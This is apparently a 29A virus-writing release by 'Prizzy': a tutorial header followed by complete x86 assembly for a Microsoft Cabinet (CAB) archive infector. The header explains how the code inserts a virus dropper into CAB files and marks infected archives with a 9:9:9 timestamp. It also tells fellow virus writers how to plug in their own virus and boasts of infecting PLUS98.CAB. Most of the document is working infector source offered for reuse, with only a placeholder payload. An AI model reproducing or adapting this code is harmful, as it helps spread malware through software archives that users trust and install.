   ;
   ;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿
   ;  : Prizzy/29A :   Infection Microsoft CAB archive       : Prizzy/29A :
   ;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ
   ;
   ;              made in the Czech Republic
   ;
   ;   The discovering of new VX technics is self-evidence. So, let us see how
   ;   to infect Microsoft Cabinet File Format (CAB).
   ;
   ;
   ;   1. Technical Description
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Cabinet files  are compressed  packages containing  a number of related
   ;   files. The format  of  cabinet file  supports  a number of  compression
   ;   formats, including MSZIP, LZX, Quantum, or uncompressed.
   ;
   ;   1.1. Specification
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Each file stored in a cabinet file is stored completely within a single
   ;   folder. A cabinet file  may contain one or more folders.
   ;
   ;   A cabinet file contains a cabinet header (CFHEADER), followed by one or
   ;   more cabinet folder (CFFOLDER) entries, a series of one or more cabinet
   ;   file (CFFILE) entries, and  the actual  compressed file data  in CFDATA
   ;   entries. The compression file data in the CFDATA entry is stored in one
   ;   of several compression formats.
   ;
   ;   2. Cabinet infection
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   When this program opened any CAB file, read header, make this checking:
   ;   * compare CAB indetification "MSCF"
   ;   * get CAB version, if it's different then 0x0103, then exit
   ;   * get CAB volume number - only the first cabinet
   ;
   ;   Then it calculate offset of the first file struct (over CABh_FirstRec),
   ;   and read its time,  if it is 0x4924 then cabinet has been infected yet.
   ;   Well, on this place I must write I could not  find other way how to get
   ;   whether cabinet  file is infected (but never change CABh_ID  because of
   ;   extraction program which will have some problems).
   ;
   ;   To change compression type (to stored)  I must insert new  folder which
   ;   it contains compression type. I find out  number of files and by random
   ;   generator I'll get new file struct position in CAB. And 'cause all file
   ;   structs and folders are in the beginning of file,  I must allocate free
   ;   memory (through  VirtualAlloc)  and  copy "whole" file  there.  Then  I
   ;   create new entry and I'll wrote it in the end of file.
   ;
   ;   3. Very, very stupid Microsoft Cabinet File Format
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   This is the worst program which I coded so far. Since so stupidly built
   ;   archive format I have  never seen  before. All formats  which  has been
   ;   created by Microsoft are idiotic (like is their macro files - Word,HLP)
   ;
   ;      * To change compression type I must include new folder - although it
   ;    can be at file struct
   ;      * In the file structure has uncomprerssed file offset and because of
   ;    this different information (all archivez has compressed file offs)
   ;    I couldn't store my dropper inside CAB file
   ;      * This format don't support fully CRC - yes, it can be, or not
   ;      * Its compressed data is stored in several parts (too stupid)
   ;
   ;   4. Limitation this CAB infector
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   The first and the latest thing is CAB file size must be lesser then 5Mb
   ;   Since I must copy this size to buffer and back to CAB file. It's 'cause
   ;   of "uncompressed file offset" as I wrote above. Although, I successfuly
   ;   infected Microsoft Plus! 98 cabinet file (PLUS98.CAB - 97,440 megabyte)
   ;
   ;   5. What do for compatibility with your viruses
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Make this changes:
   ;   * change name of your CAB file: standard is "rb000.cab" which you
   ;     can found in "\WINDOWS\SYSBCKUP" but only under Win98 (maybe)
   ;   * change DropperSize on your real virus size
   ;   * change my random_number_generator on yours
   ;
   ;   6. Intending under these technics
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   I successfuly infected ARJ,ZIP,LHA,PAK - RAR/ACE in my Win9x.Prizzy and
   ;   now it is Microsoft Cabinet File (CAB). What will  be next ? I will say
   ;   you it. All these archive infections has one bug. Your virus dropper is
   ;   in stored compression type and dropper is stored (mostly) in the end of
   ;   file. Do you think it will be difficult to compress your dropper ? No ,
   ;   whether you use what have user in the computer (use proper DLL library)
   ;   For RAR it won't problem, for ACE too, CAB not at all - so what's over?
   ;   Maybe you know it but ACE is mostly use in warez scene - it's future !!
   ;
   ;   Whether anyone (preferably 29A member) would like to build this dropper
   ;   write me and I will help you - as far as I will time ('cause of school)
   ;
   ;   7. Compiling it
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;     tasm32 -ml -m5 -q -zn cab_drop.asm
   ;     tlink32 -Tpe -c -x -aa cab_drop,,, import32
   ;     pewrsec cab_drop.exe
   ;
   ;

           .386p
           .model  flat,STDCALL

           include Include\Win32API.inc

           extrn   CreateFileA:proc    ;file operations
           extrn   ReadFile:proc
           extrn   WriteFile:proc
           extrn   GetFileSize:proc
           extrn   SetFilePointer:proc
           extrn   CloseHandle:proc

           extrn   VirtualAlloc:proc
           extrn   VirtualFree:proc
           extrn   MessageBoxA:proc
           extrn   ExitProcess:proc

   ;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   .data
           db  ?
   .code

   ;ÄÄÄ´ some global's data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   COMPARE_BY_TIME equ see_above_what_this_mean

   HeaderSize  equ 65536           ;for header+files
   DropperSize equ Error_Message - Title_Message
   DropperFullSize equ (CABe_Compr_data - CAB_directory_start) + \
               DropperSize

   ArchiveName db  'rb000.cab',0       ;any .CAB file

   FileHandle  dd  00000000h       ;handle of the opened file
   FileSize    dd  00000000h       ;for moving in file
   FileHeaderSize  dd  00000000h       ;real size of CAB header

   Title_Message   db  'CAB infector - (c)oded by Prizzy/29A',0
   Error_Message   db  'Operation failed.',0
   Success_Message db  'Micro$oft Cabinet File has been infected...',0

   cab_buffer  dd  00000000h       ;CAB file in memory
   mem_buffer  dd  00000000h       ;place in memory
   last_error  dd  00000000h
   my_Folder   dd  00000000h       ;offset of my new folder
   my_File     dd  00000000h       ;offset of my file struct

   ;ÄÄÄ´ program starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   cabinet_dropper:

           ; at first we will open archive
           mov ecx,GENERIC_READ or GENERIC_WRITE
           mov edx,offset ArchiveName
           @OpenFile
           cmp eax,-1          ;success ?
           jz  __cab_error
           mov [FileHandle],eax    ;save handle

           ; get file size
           push    00000000h       ;bigger then 2^64-2 ?
           push    [FileHandle]
           call    GetFileSize
           mov [FileSize],eax

           ; allocate memory
           mov ecx,[FileSize]
           add ecx,DropperFullSize
           call    __malloc
           mov [mem_buffer],eax

           ; real file size
           mov [FileHeaderSize],HeaderSize
           cmp [FileSize],HeaderSize
           ja  __cab_read
           mov eax,[FileSize]
           mov [FileHeaderSize],eax

           ; read header+all files structs
       __cab_read:
           push    00000000h
           push    offset last_error
           push    [FileHeaderSize]
           push    [mem_buffer]
           push    [FileHandle]
           call    ReadFile

           ; check CAB archive
           mov edi,[mem_buffer]
           cmp [edi],'FCSM'        ;"MSCF" signature ?
           jnz __cab_error     ;exit without dealloc !!
           cmp word ptr [edi]. \
               (CABh_VersionMin - CAB_header_start),0103h
           jnz __cab_error

           ; get volume number - I want only 1st volume
           cmp word ptr [edi]. \
               (CABh_Number - CAB_header_start),0000h
           jnz __cab_error

           ; CAB infected ? - check time of the 1st entry
           movzx   esi,word ptr [edi]. \
               (CABh_FirstRec - CAB_header_start)
           add esi,[mem_buffer]

       IFDEF COMPARE_BY_TIME
           cmp word ptr [esi]. \
               (CABf_Time - CAB_file_start),4924h  ;9:9:9 ?
           jz  __cab_error
           mov word ptr [esi]. \
               (CABf_Time - CAB_file_start),4924h  ;new time
       ENDIF

           ; modify folder's starts
           push    esi
           movzx   ebx,word ptr [edi]. \
               (CABh_nFolders - CAB_header_start)
       __cab_modify:
           or  ebx,ebx
           jz  __cab_modified
           sub esi,(CAB_file_start - CAB_directory_start)
           add dword ptr [esi]. \
               (CABd_FirstRec - CAB_directory_start), \
               (CAB_entry - CAB_directory_start)
           dec ebx
           jmp __cab_modify
       __cab_modified:
           pop esi

           ; make place for new folder
           push    edi
           mov edi,esi
           add edi,(CAB_file_start - CAB_directory_start)
           mov ecx,[FileHeaderSize]
           add ecx,[mem_buffer]
           sub ecx,esi
           call    __movsd_back
           pop edi

           ; save offset - ESI=place of the new folder
           add esi,00000004h
           mov [my_Folder],esi     ;modify later

           ; get number of files
           movzx   ebx,word ptr [edi]. \
               (CABh_nFiles - CAB_header_start)
           push    ebx
           call    __rnd_number
           xor edx,edx
           mov ecx,ebx
           div ecx
           inc edx
           push    edx

           ; modify all file structs in CAB archive - wow
           add esi,(CAB_file_start - CAB_directory_start)
           push    edi
           mov edi,esi
       __cab_search:
           or  edx,edx
           jz  __cab_searched
           add edi,(CABf_FileName - CAB_file_start)
           mov ecx,-1
           xor al,al
           repnz   scasb
           dec edx
           jmp __cab_search
       __cab_searched:
           mov esi,edi
           pop edi

           ; update file in folder
           mov dx,[edi].(CABh_nFolders - CAB_header_start)

           ; make place for new file struct
           push    edi
           mov edi,esi
           add edi,(CAB_entry - CAB_file_start)
           mov ecx,[FileHeaderSize]
           add ecx,[mem_buffer]
           sub ecx,esi
           call    __movsd_back

           ; save offset of the file struct
           add esi,00000004h
           mov edi,esi
           mov esi,offset CAB_file_start
           mov [esi].(CABf_Flags - CAB_file_start),dx
           mov ecx,(CAB_entry - CAB_file_start)
           rep movsb
           mov esi,edi
           pop edi

           ; modify files - ESI=next file struct
           pop edx
           pop ebx
           sub ebx,edx         ;files to modify
           push    edi
           mov edi,esi
       __cab_search_2:
           or  ebx,ebx
           jz  __cab_searched_2
           add edi,(CABf_FileName - CAB_file_start)
           mov ecx,-1
           xor al,al
           repnz   scasb
           dec ebx
           jmp __cab_search_2
       __cab_searched_2:
           mov esi,edi
           pop edi

           ; change CAB header
           inc word ptr [edi]. \   ;add new folder
               (CABh_nFolders - CAB_header_start)
           inc word ptr [edi]. \   ;add new files
               (CABh_nFiles - CAB_header_start)
           add dword ptr[edi]. \
               (CABh_FileSize - CAB_header_start),DropperFullSize
           add dword ptr[edi]. \
               (CABh_FirstRec - CAB_header_start), \
               CAB_file_start - CAB_directory_start

           ; ESI=the beginning of the data
           sub esi,[mem_buffer]

           ; allocate memory for dropper
           mov ecx,[FileSize]
           sub ecx,esi
           add ecx,DropperFullSize
           call    __malloc
           mov [cab_buffer],eax

           ; change folder's values
           mov edi,[my_Folder]
           mov eax,[FileSize]
           add eax,(CAB_entry - CAB_directory_start)
           mov [edi],eax       ;offset to the 1st entry
           mov word ptr [edi+4],0001h  ;number of blocks
           mov word ptr [edi+6],0000h  ;type of compress

           ; read CAB file - set pointer
           push    00000000h       ;FILE_BEGIN defined in WinBase.H
           push    00000000h       ;bigger then 2^64-2 ?
           mov eax,esi
           sub eax,(CAB_entry - CAB_directory_start)
           push    eax         ;new position
           push    [FileHandle]
           call    SetFilePointer

           ; read CAB file to <cab_buffer>
           push    00000000h
           push    offset last_error
           mov eax,[FileSize]
           sub eax,esi
           add eax,(CAB_entry - CAB_directory_start)
           push    eax
           push    [cab_buffer]
           push    [FileHandle]
           call    ReadFile

           ; create new block and copy dropper
           push    esi
           mov edi,[cab_buffer]
           add edi,[FileSize]
           sub edi,esi
           add edi,(CAB_entry - CAB_directory_start)
           mov esi,offset CAB_entry        ;create new block
           mov ecx,(CABe_Compr_data - CAB_entry)
           rep movsb

           mov esi,offset Title_Message    ;change on your
           mov ecx,DropperSize         ;virus_start !!
           rep movsb
           pop esi

           ; now, I must write CAB header with new folder + struct
           ; and with modified all file structs - wow !!
           push    00000000h       ;FILE_BEGIN defined in WinBase.H
           push    00000000h       ;bigger then 2^64-2 ?
           push    00000000h       ;start of the file
           push    [FileHandle]
           call    SetFilePointer

           ; write header + file structs
           push    00000000h
           push    offset last_error
           push    esi         ;number of bytes to write
           push    [mem_buffer]        ;place in memory
           push    [FileHandle]
           call    WriteFile

           ; set pointer to write dropper
           push    00000000h       ;FILE_BEGIN defined in WinBase.H
           push    00000000h
           push    esi
           push    [FileHandle]
           call    SetFilePointer

           ; ...and write my dropper
           push    00000000h       ;bigger then 2^64-2
           push    offset last_error
           mov eax,[FileSize]
           sub eax,esi
           add eax,(CABe_Compr_data - CAB_directory_start) + \
                   DropperSize
           push    eax         ;number of bytes to write
           push    [cab_buffer]        ;place in memory
           push    [FileHandle]        ;handle
           call    WriteFile

           ; close file
           push    [FileHandle]
           call    CloseHandle

           ; dealloc memory
           mov ecx,[cab_buffer]
           call    __mdealloc
           mov ecx,[mem_buffer]
           call    __mdealloc

           ; show message
           push    MB_OK or MB_ICONINFORMATION
           push    offset Title_Message
           push    offset Success_Message
           push    00000000h
           call    MessageBoxA

       __cab_finish:
           push    00000000h
           call    ExitProcess

       __cab_error:
           push    MB_OK or MB_ICONSTOP
           push    offset Title_Message
           push    offset Error_Message
           push    00000000h
           call    MessageBoxA
           jmp __cab_finish

   ;ÄÄÄ´ memory operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   __malloc:   push    PAGE_READWRITE
           push    MEM_COMMIT
           push    ecx
           push    0
           call    VirtualAlloc
           ret

   __mdealloc: push    MEM_DECOMMIT
           push    ecx
           push    0
           call    VirtualFree
           ret

   __rnd_number:   in  al,40h          ;very simple random
           mov ah,al           ;generator intead this
           in  al,41h          ;use yours
           push    ax
           rol eax,16
           pop ax
           xor ax,0A72Fh
           ret

   __movsd_back:   add esi,ecx         ;my special move function
           dec esi         ;input: ECX=bytes to move
           add edi,ecx         ;   ESI=source
           dec edi         ;   EDI=destination
           std
           shr ecx,01h         ;NOTE:  ESI and EDI ain't
           jnc __mb_nomovsb        ;   real addresses - to
           movsb               ;   undestand see on the
       __mb_nomovsb:               ;   fourth instructions
           jz  __mb_finish
           dec esi
           dec edi
           shr ecx,01h
           jnc __mb_nomovsw
           movsw
           jz  __mb_finish
       __mb_nomovsw:
           sub esi,00000002h
           sub edi,00000002h
           rep movsd           ;copy me - I wanna travel
       __mb_finish:
           cld
           ret

   ;ÄÄÄ´ archive structure ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

       CAB_header_start:

   CABh_Magic  db  'MSCF'          ;"MSCF" signature
   CABh_Reserved1  dd  00000000h       ;reserved
   CABh_FileSize   dd  00000000h       ;file size of this cabinet
   CABh_Reserved2  dd  00000000h       ;reserved
   CABh_FirstRec   dd  00000000h       ;offset of the 1st entry
   CABh_Reserved3  dd  00000000h       ;reserved
   CABh_VersionMin db  00h         ;CAB file format version
   CABh_VersionMaj db  00h         ;curently: 0x0103
   CABh_nFolders   dw  0000h           ;number of folders
   CABh_nFiles dw  0000h           ;number of files
   CABh_Flags  dw  0000h           ;1=exist its prev. cabinet
                           ;2=exist its next  cabinet
                           ;4=exist its reser. field
   CABh_ID     dw  0000h           ;identification number
   CABh_Number dw  0000h           ;number of cab (0=the first)

       CAB_reserved:

   CABr_length dw  0000h           ;if CABh_Flags=4
   CABr_reserved   equ this byte

       CAB_directory_start:

   CABd_FirstRec   dd  00000000h       ;offset of the 1st dir
   CABd_nData  dw  0000h           ;number of cfDATA structz
   CABd_Compress   dw  0000h           ;compression type
   CABd_Reserved   equ this byte       ;this can be reserved area

       CAB_file_start:

   CABf_UnCompSize dd  Error_Message - \   ;file size (uncompressed)
               Title_Message
   CABf_FileStart  dd  00000000h       ;offset of the file
   CABf_Flags  dw  0000h           ;0000=file in folder #0
                           ;0001=file in folder #1
                           ;FFFD=file from prev
                           ;FFFE=file to next
                           ;FFFF=file prev_and_next
   CABf_Date   dw  2729h           ;date (9.9.1999 - wow!)
   CABf_Time   dw  4924h           ;time (9:9:9)
   CABf_Attribs    dw  0020h           ;attr of the file
   CABf_FileName   db  'cab_drop.txt',0    ;file_name + 00h

       CAB_entry:

   CABe_CRC    dd  00000000h       ;checksum of this entry
   CABe_Compr  dw  Error_Message - \   ;compressed size
               Title_Message
   CABe_UnCompr    dw  Error_Message - \   ;uncompressed size
               Title_Message
   CABe_Compr_data equ this byte

   ;ÄÄÄ´ end of program ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   end cabinet_dropper
